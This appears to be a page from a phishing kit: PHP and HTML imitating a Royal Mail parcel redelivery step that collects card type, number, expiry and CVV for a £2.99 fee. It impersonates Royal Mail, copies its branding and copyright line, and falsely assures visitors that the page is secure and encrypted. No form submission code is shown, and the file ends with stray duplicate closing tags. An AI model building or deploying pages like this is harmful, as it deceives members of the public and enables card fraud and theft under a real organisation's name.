<?php
session_start();
if (!isset($_POST['booking_id']) && !isset($_SESSION['booking_id'])) {
    header("Location: index.php");
    exit();
}
$booking_id = $_POST['booking_id'] ?? $_SESSION['booking_id'];
$_SESSION['booking_id'] = $booking_id;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delivery Details | Royal Mail</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        body { font-family: Arial, sans-serif; margin:0; background:#f4f4f4; }
        .header { background:#2A2A2D; color:white; padding:15px 0; }
        .logo { font-size:28px; font-weight:bold; }
        .container { max-width:1100px; margin:30px auto; background:white; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
        .content { padding:40px; }
        h1, h2 { color:#2A2A2D; }
        label { display:block; margin:15px 0 8px; font-weight:600; }
        input, select { width:100%; padding:12px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; }
        button { background:#e4002b; color:white; padding:14px 30px; border:none; font-size:16px; cursor:pointer; border-radius:4px; margin-top:20px; }
        button:hover { background:#c40025; }
        .card-icons { font-size:28px; margin:10px 5px; }
        .rm-footer { background:#2A2A2D; color:#ccc; padding:30px; text-align:center; font-size:14px; }
    </style>
</head>
<body>

<div class="header">
    <div style="max-width:1100px;margin:auto;display:flex;align-items:center;justify-content:space-between;padding:0 20px;">
        <div class="logo">Royal Mail</div>
        <div>Redelivery – Step 2 of 2</div>
    </div>
</div>

<div class="container">
    <div class="content">
        <h1>Delivery Information</h1>
        <p>Booking Reference: <strong><?= htmlspecialchars($booking_id) ?></strong></p>

        <h2>Choose Delivery Slot</h2>
        <select name="slot">
            <option value="">Select a delivery date and time...</option>
            <option value="slot1">Tomorrow (09:00 - 11:00)</option>
            <option value="slot2">Tomorrow (13:00 - 15:00)</option>
            <option value="slot3">Friday (10:00 - 12:00)</option>
            <option value="slot4">Friday (14:00 - 16:00)</option>
        </select>

        <h2>Payment Details</h2>
        
        <div class="form-group">
            <label>Card Type</label>
            <select name="card_type" required>
                <option value="">Select card type</option>
                <option value="visa">Visa</option>
                <option value="mastercard">Mastercard</option>
                <option value="amex">American Express</option>
            </select>
        </div>

        <div class="form-group">
            <label>Card Number</label>
            <input type="text" placeholder="1234 5678 9012 3456" maxlength="19">
        </div>

        <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;">
            <div>
                <label>Expiry Date</label>
                <select name="expiry_month">
                    <option value="">Month</option>
                    <?php for($i=1;$i<=12;$i++) echo "<option>".sprintf("%02d",$i)."</option>"; ?>
                </select>
            </div>
            <div>
                <label>Year</label>
                <select name="expiry_year">
                    <option value="">Year</option>
                    <?php for($y=2025;$y<=2035;$y++) echo "<option>$y</option>"; ?>
                </select>
            </div>
        </div>

        <div class="form-group">
            <label>Security Code (CVV)</label>
            <input type="text" placeholder="123" maxlength="4" style="width:120px;">
        </div>

        <button type="submit">Pay £2.99 & Confirm Redelivery</button>

        <p style="font-size:13px;color:#666;margin-top:20px;">
            This is a secure Royal Mail payment page. Your card details are encrypted.
        </p>
    </div>
</div>

<div class="rm-footer">
    © Royal Mail Group Limited 2025<br>
    <a href="#" style="color:#ccc;margin:0 10px;">Privacy</a>
    <a href="#" style="color:#ccc;margin:0 10px;">Terms</a>
    <a href="#" style="color:#ccc;margin:0 10px;">Cookies</a>
</div>

</body>
</html>
</div>
</body>
</html>
